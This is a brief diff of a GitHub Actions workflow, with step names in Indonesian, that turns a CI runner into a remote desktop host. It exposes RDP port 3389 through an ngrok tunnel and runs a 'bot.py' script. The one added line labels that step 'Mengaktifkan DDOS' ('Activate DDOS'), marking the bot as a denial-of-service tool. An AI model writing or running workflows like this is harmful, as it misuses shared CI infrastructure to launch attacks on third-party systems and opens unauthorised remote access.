@@ -40,6 +40,7 @@ jobs:
         copy "Ganti Password.exe" "C:\Users\Public\Desktop\Ganti Password.exe"
     - name: Membuat Tunnel Dan Running Bot Client.
       run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp --region ap 3389"'
+    - name : Mengaktifkan DDOS.
       run: Start-Process Powershell -ArgumentList '-Noexit -Command "python bot.py"'
     - name: Connect Ke RDP Kamu CPU 2 Core - 7GB Ram - 256 SSD.
       run: cmd /c start.bat
